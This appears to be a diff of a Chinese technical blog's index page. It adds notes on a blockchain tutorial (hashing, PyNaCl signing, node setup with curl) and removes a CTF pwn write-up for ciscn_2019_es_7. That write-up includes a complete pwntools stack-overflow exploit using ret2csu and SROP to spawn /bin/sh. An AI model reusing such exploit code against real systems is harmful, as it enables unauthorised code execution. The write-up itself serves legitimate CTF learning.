+<h3 id="example-2"><a href="#example-2" class="headerlink" title="example"></a>example</h3><h4 id="1-验证数据完整"><a href="#1-验证数据完整" class="headerlink" title="1 验证数据完整"></a>1 验证数据完整</h4><blockquote>
+<p>发送的时候，把原文和sha256加密的东西一起发送过去</p>
+<p>验证的时候，对数据sha256，对比值是否相等</p>
+</blockquote>
+<p>alice发生数据给bob</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">message = <span class="string">"Hello Bob, Let's meet at the Kruger National Park on 2020-12-12 at 1pm."</span></span><br><span class="line">hash_message = sha256((<span class="string">"p@55w0rd"</span> + message).encode()).hexdigest()</span><br><span class="line">print(hash_message)</span><br></pre></td></tr></table></figure>
+
+<p>bob验证数据未被修改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">alices_message = <span class="string">"Hello Bob, Let's meet at the Kruger National Park on 2020-12-12 at 1pm."</span></span><br><span class="line">alices_hash = <span class="string">"39aae6ffdb3c0ac1c1cc0f50bf08871a729052cf1133c4c9b44a5bab8fb66211"</span></span><br><span class="line">hash_message = sha256((<span class="string">"p@55w0rd"</span> + alices_message).encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> hash_message == alices_hash:</span><br><span class="line">    print(<span class="string">"Message has not been tampered with"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731171637680.png" alt="image-20210731171637680"></p>
+<h4 id="2-加密传送数据"><a href="#2-加密传送数据" class="headerlink" title="2 加密传送数据"></a>2 加密传送数据</h4><blockquote>
+<p>发送数据：</p>
+<ul>
+<li>公钥发送</li>
+<li>私钥对数据签名</li>
+</ul>
+<p>接收</p>
+<p>verify验证</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nacl.encoding</span><br><span class="line"><span class="keyword">import</span> nacl.signing</span><br><span class="line"></span><br><span class="line"><span class="comment">#Generate a new key-pair for Bob</span></span><br><span class="line">bobs_private_key = nacl.signing.SigningKey.generate()</span><br><span class="line">bobs_public_key = bobs_private_key.verify_key</span><br><span class="line">print(bobs_public_key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Since it's bytes,we'll need to serialize the key to a readable format before publishing it:</span></span><br><span class="line">bobs_public_key_hex = bobs_public_key.encode(encoder=nacl.encoding.HexEncoder)</span><br><span class="line">print(<span class="string">"\n\n"</span>)</span><br><span class="line">print(bobs_public_key_hex)</span><br><span class="line"><span class="comment">#Now,Let's sign a message with it</span></span><br><span class="line">signed = bobs_private_key.sign(<span class="string">b"Send $37 to Alice"</span>)</span><br><span class="line">print(<span class="string">"\n\n"</span>)</span><br><span class="line">print(signed)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731171918053.png" alt="image-20210731171918053"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nacl.encoding</span><br><span class="line"><span class="keyword">import</span> nacl.signing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># From the above example...</span></span><br><span class="line">bobs_public_key = <span class="string">'acc5cc1750b841f0b383e5f620282946476c37d602c42b9dbaccb9db758b728e'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We generate the verify_key</span></span><br><span class="line">verify_key = nacl.signing.VerifyKey(bobs_public_key,encoder=nacl.encoding.HexEncoder)</span><br><span class="line"></span><br><span class="line">signed_message = <span class="string">b"\x8b\x08\x93\xb0\xda!r)\x19i\x18d\xe0\xbbi\x8a@c\xf8-\x8e\xbdr\xb7\xe8%\x0eez\x99\xd2\x0c\xc8\x14_\x8d\x02zWV\x8e\x81\xfb[9\x9b\x9d\x1b\xbb\xda\xe7\x05\x945\xc2\xef~\x17\x90\xfd3'\xc3\x00Send $37 to Alice"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Now we attempt to verify the message</span></span><br><span class="line"><span class="comment"># Any invalidation will result in an Exception being thrown</span></span><br><span class="line">verify_key.verify(signed_message)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731172022526.png" alt="image-20210731172022526"></p>
+<p>如果修改bobs_public_key/signed_message为错误的，则</p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731172057501.png" alt="image-20210731172057501"></p>
+<h2 id="chapter-7"><a href="#chapter-7" class="headerlink" title="chapter 7"></a>chapter 7</h2><blockquote>
+<p>整合</p>
+</blockquote>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731172254999.png" alt="image-20210731172254999"></p>
+<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="0-完整代码"><a href="#0-完整代码" class="headerlink" title="0 完整代码"></a>0 完整代码</h2><p>链接：<a href="https://github.com/dvf/blockchain" target="_blank" rel="noopener">https://github.com/dvf/blockchain</a></p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807173529463.png" alt="image-20210807173529463"></p>
+<h2 id="1-工具安装"><a href="#1-工具安装" class="headerlink" title="1 工具安装"></a>1 工具安装</h2><p>安装python（版本3.8）和poetry</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install python3.8</span><br><span class="line">#ln -s 把python3和python3.8链接</span><br><span class="line"></span><br><span class="line">$ curl -sSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;sdispater&#x2F;poetry&#x2F;master&#x2F;get-poetry.py | python</span><br><span class="line"></span><br><span class="line">#安装依赖</span><br><span class="line">poetry add pynacl structlog colorama marshmallow marshmallow-oneofschema aiohttp</span><br><span class="line"></span><br><span class="line">pip install pipenv </span><br><span class="line">pipenv install </span><br><span class="line">pip install Flask&#x3D;&#x3D;0.12.2 requests&#x3D;&#x3D;2.18.4</span><br></pre></td></tr></table></figure>
+
+<h2 id="1启动节点"><a href="#1启动节点" class="headerlink" title="1启动节点"></a>1启动节点</h2><p>代码下载后放到服务器上，启动节点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ pipenv run python blockchain.py			#默认启动端口5000，启动5000端口的节点</span><br><span class="line">$ pipenv run python blockchain.py -p 5001</span><br><span class="line">$ pipenv run python blockchain.py --port 5002</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807171341824.png" alt="image-20210807171341824"></p>
+<h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2 使用"></a>2 使用</h2><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>访问区块链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ip:port&#x2F;chain 可以访问区块链</span><br><span class="line">http:&#x2F;&#x2F;156.233.254.97:5002&#x2F;chain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807171442690.png" alt="image-20210807171442690"></p>
+<h3 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ip:port&#x2F;mine</span><br><span class="line">http:&#x2F;&#x2F;156.233.254.97:5002&#x2F;mine</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807171527803.png" alt="image-20210807171527803"></p>
+<img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/image-20210807171542372.png" alt="image-20210807171542372" style="zoom:67%;">
+
+<h3 id="创建交易"><a href="#创建交易" class="headerlink" title="创建交易"></a>创建交易</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;</span><br><span class="line"> &quot;sender&quot;: &quot;d4ee26eee15148ee92c6cd394edd974e&quot;,</span><br><span class="line"> &quot;recipient&quot;: &quot;someone-other-address&quot;,</span><br><span class="line"> &quot;amount&quot;: 1234</span><br><span class="line">&#125;&#39; &quot;http:&#x2F;&#x2F;156.233.254.97:5004&#x2F;transactions&#x2F;new&quot;</span><br><span class="line"></span><br><span class="line">curl -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;</span><br><span class="line"> &quot;sender&quot;: &quot;d4ee26eee15148ee92c6cd394edd974e&quot;,</span><br><span class="line"> &quot;recipient&quot;: &quot;someone-other-address&quot;,</span><br><span class="line"> &quot;amount&quot;: 7979</span><br><span class="line">&#125;&#39; &quot;http:&#x2F;&#x2F;156.233.254.97:5002&#x2F;transactions&#x2F;new&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807171921098.png" alt="image-20210807171921098"></p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807172056677.png" alt="image-20210807172056677"></p>
+<h3 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h3><p>5002端口里面有三个块</p>
+<p>5003端口开一个，只有一个初始块</p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807172258623.png" alt="image-20210807172258623"></p>
+<p>将2注册到3上，让5003知道有5002这个节点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;</span><br><span class="line">	&quot;nodes&quot;:[&quot;156.233.254.97:5002&quot;]</span><br><span class="line">&#125;&#39; &quot;http:&#x2F;&#x2F;156.233.254.97:5003&#x2F;nodes&#x2F;register&quot;</span><br><span class="line"></span><br><span class="line">curl -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;</span><br><span class="line">	&quot;nodes&quot;:[&quot;156.233.254.97:5004&quot;]</span><br><span class="line">&#125;&#39; &quot;http:&#x2F;&#x2F;156.233.254.97:5005&#x2F;nodes&#x2F;register&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807172505247.png" alt="image-20210807172505247"></p>
+<p>通过共识，5003更新节点跟5002一样</p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807172558767.png" alt="image-20210807172558767"></p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210807172613733.png" alt="image-20210807172613733"></p>
+
+	
+	</div>
+  <a type="button" href="/2021/08/07/《Learn-Blockchain-by-Building-One》笔记以及操作/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/06/09/2021-ciscn-pwn初赛/" >2021_ciscn_pwn初赛</a>
 		</h3>
 		</div>
@@ -1772,115 +1946,6 @@ var _hmt = _hmt || [];
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/05/06/ciscn-2019-es-7/" >ciscn_2019_es_7</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-05-06  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>其实做过一次<a href="https://warm-winter.github.io/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/#12-ciscn-2019-s-3" target="_blank" rel="noopener">第一次wp</a>，，，但是再做还是不太可，重新写一篇【两篇侧重点不一样】</p>
-</blockquote>
-<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><blockquote>
-<p>两个函数，read和write</p>
-</blockquote>
-<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185234819.png" alt="image-20210506185234819"></p>
-<blockquote>
-<p>输入和打印的是同一个地址，rsp+buf，buf的长度为0x10。</p>
-<p>所以栈溢出的偏移为0x10，再下一个地址是rsp，ret的时候，pop eip会取过来。</p>
-</blockquote>
-<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185325681.png" alt="image-20210506185325681"></p>
-<blockquote>
-<p>程序给了两个后门函数</p>
-<p>第一个是rax，设置0xf，可以进行srop</p>
-<p>第二个设置为execve的调用号，设置参数为“/bin/sh”、0、0（必须设置，因为vuln函数中rdi，rsi和rdx都有值）即可get shell</p>
-</blockquote>
-<p><img src="/2021/05/06/ciscn-2019-es-7/image-20210506185517298.png" alt="image-20210506185517298"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>综上，有两种方法可以进行漏洞利用</p>
-<ol>
-<li>利用gadget2，需要设置三个寄存器参数，可以通过ret2csu来设置</li>
-<li>利用gadget1，srop来get shell</li>
-</ol>
-<blockquote>
-<p> 其次，程序还可以泄漏信息，在输入0x10处和0x20处都存在栈上的地址，布置“/bin/sh”在上面，泄漏栈地址，即计算得到binsh的地址。</p>
-<p> 为了程序正常返回继续利用，故泄漏0x20的地址。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fffffffdee0</span><br><span class="line">0x7fffffffdee0:	0x6161616161616161	0x0000000000000a61#[rsp+buf]</span><br><span class="line">0x7fffffffdef0:	0x00007fffffffdf10	0x0000000000400536</span><br><span class="line">0x7fffffffdf00:	0x00007fffffffdff8	0x0000000100000000</span><br><span class="line">0x7fffffffdf10:	0x0000000000400540	0x00007ffff7a03bf7</span><br><span class="line">0x7fffffffdf20:	0x0000000000000001	0x00007fffffffdff8</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x30 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  ed 04 40 00  00 00 00 00  0a 05 40 00  00 00 00 00  │··@·│····│··@·│····│</span><br><span class="line">    00000020  a8 43 ed d1  fe 7f 00 00  00 00 00 00  01 00 00 00  │·C··│····│····│····│</span><br><span class="line">    00000030</span><br><span class="line">[+] 0x7ffed1ed4290</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ffed1ed4290</span><br><span class="line">0x7ffed1ed4290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x7ffed1ed42a0:	0x00007ffed1ed42a0	0x000000000040050a</span><br><span class="line">0x7ffed1ed42b0:	0x00007ffed1ed43a8	0x0000000100000000</span><br></pre></td></tr></table></figure>
-
-<h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>因为需要设置3个参数，需要利用万能gadget，但是注意一点是，第一个参数只能设置低8位，但是binsh的地址有12位，所以第一个参数还需要通过pop rdi，单独设置。</p>
-<ol>
-<li><p>布置“/bin/sh” =&gt; 地址通过上面已经泄漏</p>
-</li>
-<li><p>设置rax = 59</p>
-</li>
-<li><p>开始ret2cus</p>
-<p>part1</p>
-<p>​    rbx = 0，rbp = 1，跳出循环</p>
-<p>​    call []，选择binsh+0x10的地址，也就是设置rax=59</p>
-<p>​    设置3个参数，都为0即可</p>
-<p>part2</p>
-<p>​    ‘a’×0x56=&gt; 到达ret</p>
-<p>​    设置第一个参数</p>
-<p>syscall即可</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39; * 2 </span><br><span class="line">payload +&#x3D; p64(mov_rax_59)</span><br><span class="line">payload +&#x3D; p64(part1) </span><br><span class="line">payload +&#x3D; p64(0) + p64(1)</span><br><span class="line">payload +&#x3D; p64(binsh+0x10)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(part2)</span><br><span class="line">payload +&#x3D; &#39;a&#39;*56</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload +&#x3D; p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_7"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",26076)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">mov_rax_59 = <span class="number">0x00004004E2</span></span><br><span class="line">part1 = <span class="number">0x0040059A</span></span><br><span class="line">part2 = <span class="number">0x000400580</span></span><br><span class="line">back = <span class="number">0x04004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(mov_rax_59)</span><br><span class="line">payload += p64(part1) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigFrame = SigreturnFrame()</span><br></pre></td></tr></table></figure>
-
-<h5 id="设置寄存器"><a href="#设置寄存器" class="headerlink" title="设置寄存器"></a>设置寄存器</h5><ol>
-<li>rax = execve调用号</li>
-<li>rdi = binsh地址</li>
-<li>rsi = 0</li>
-<li>rdx = 0</li>
-<li>rip = syscall</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sigFrame.rax = constants.SYS_execve</span><br><span class="line">sigFrame.rdi = binsh</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall</span><br></pre></td></tr></table></figure>
-
-<h5 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h5><ol>
-<li>发送“/bin/sh\x00”两个</li>
-<li>gadget，这里会retn一下，让rsp下移</li>
-<li>放上syscall，接着就放上str(sigFrame)【在rsp的下一个位置】</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(pop_rax_15)+p64(syscall)+str(sigFrame)</span><br></pre></td></tr></table></figure>
-
